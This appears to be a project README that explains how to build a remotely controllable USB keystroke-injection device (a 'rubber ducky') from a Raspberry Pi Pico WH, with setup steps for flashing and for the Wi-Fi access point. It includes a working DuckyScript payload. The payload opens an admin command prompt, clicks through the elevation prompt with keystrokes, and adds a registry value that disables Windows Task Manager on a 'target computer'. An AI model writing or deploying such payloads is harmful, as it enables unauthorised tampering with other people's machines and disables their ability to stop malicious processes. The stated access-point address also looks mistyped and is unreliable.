# Raspberry Pi Pico WH as HID for Keystroke Injection
A step-by-step guide to turn your Raspberry Pi Pico WH into a HID device. Works as a rubber ducky and you can remotely add payloads.
I have used a Raspberry pi pico wh for this project.

---
## Installation
***NOTE: To edit safely (setup mode): Use a jumper wire to connect GP0 (pin 1) to GND (pin 3) on Pico WH before plugging into your computer.***
1. Download CircuitPython UF2 file for Raspberry Pi Pico W from [CircuitPython for rpi pico](https://circuitpython.org/board/raspberry_pi_pico_w/). Download the latest release.
2. Connect Pico WH to your computer via USB while holding the `BOOTSEL` button. It appears as a drive named RPI-RP2.
3. Copy the entire "lib" folder to the root of the `CIRCUITPY` drive.
4. Copy code.py, duckyinpython.py, secrets.py webapp.py and wsgiserver.py to the root of CIRCUITPY. (edit the secrets.py accordingly for setting up the access point.)
5. Create a payload file: Open a text editor, write DuckyScript code or you can check out the payloads in this repository.
6. Save the file as payload.dd in the root of CIRCUITPY.
7. Remove the jumper. Plug Pico into target computer; it emulates a keyboard and injects the payload keystrokes.

---
## Connecting to the pico via its AP
edit the secrets.py file and change ssid of your pico and set the password. You then need to connect to the AP using the credentials.
Open a web browser and go to 198.162.4.1 (this is the default ip of the pico), here you can add or edit your payloads remotely after you plus it in to the target computer.
<img width="636" height="315" alt="image" src="https://github.com/user-attachments/assets/db497e4f-d9ef-41f6-93d0-0f195e2dd6fc" /><br>
<img width="675" height="316" alt="image" src="https://github.com/user-attachments/assets/74e0a137-c447-48ee-876b-30e73fe5f24c" /><br>


---
## Example payload
This payload here will disble the taskmanager by opening an admin terminal.
```text
REM disable task manager in windows
DELAY 1500
GUI
DELAY 1000
STRING cmd
DELAY 500
RIGHT
DELAY 500
DOWN
DELAY 1500
ENTER
DELAY 1000
LEFT
ENTER
DELAY 2000
STRING reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
DELAY 1000
ENTER
DELAY 500
STRING exit
DELAY 500
ENTER
```
Here you can change the `DELAY` time to 2 sec or other as some computers might take more time than 1 sec.<br>

---
NOTE:
This is just an example code, you can try to create your payloads and save it to the root of the rpi as an `.dd` file after completing the installation process as explained above.
Or you can use the AP of the rpi to directly run and add payloads in real time while its pluged in to the target device.
